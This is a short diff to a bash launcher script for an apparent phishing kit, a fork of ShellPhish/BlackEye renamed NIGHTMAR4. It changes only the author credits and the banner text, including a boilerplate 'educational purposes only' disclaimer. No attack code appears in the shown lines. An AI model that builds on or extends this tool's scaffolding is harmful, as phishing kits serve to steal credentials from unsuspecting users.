@@ -1,7 +1,7 @@
 #!/bin/bash
-# BLACKEYE v1.0 is an upgrade from original ShellPhish Tool (https://github.com/thelinuxchoice/shellphish) by thelinuxchoice under GNU LICENSE 
-# Coded by: @thelinuxchoice (https://github.com/SecreTOzi/Nightmar4)
-# Upgraded by: @koadadisecret (https://github.com/SecreTOzi)
+# NİGHTMAR4 v1.0 is an upgrade from original  Tool (https://github.com/SecreTOzi) By SecreTNightmar4 Under GNU LICENSE 
+# Coded by: @SecreTNightmar4 (https://github.com/SecreTOzi/Nightmar4)
+# Upgraded by: @SecreTOzi (https://github.com/SecreTOzi)
 
 
 trap 'printf "\n";stop;exit 1' 2
@@ -214,10 +214,10 @@ banner() {
 
 
 printf "     \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
-printf "     \e[101m\e[1;77m:: responsible for any misuse or damage caused by BlackEye.  ::\e[0m\n"
+printf "     \e[101m\e[1;77m:: responsible for any misuse or damage caused by Nightmar4.  ::\e[0m\n"
 printf "     \e[101m\e[1;77m:: Only use for educational purporses!!                      ::\e[0m\n"
 printf "\n"
-printf "     \e[101m\e[1;77m::     NİGHTMAR4 v1.5! By @kodadisecret & @byyozzi     ::\e[0m\n"
+printf "     \e[101m\e[1;77m::     NİGHTMAR4 v1.5! By @SecreTNightmar4 & @byyozzi     ::\e[0m\n"
 printf "\n"
 }
 
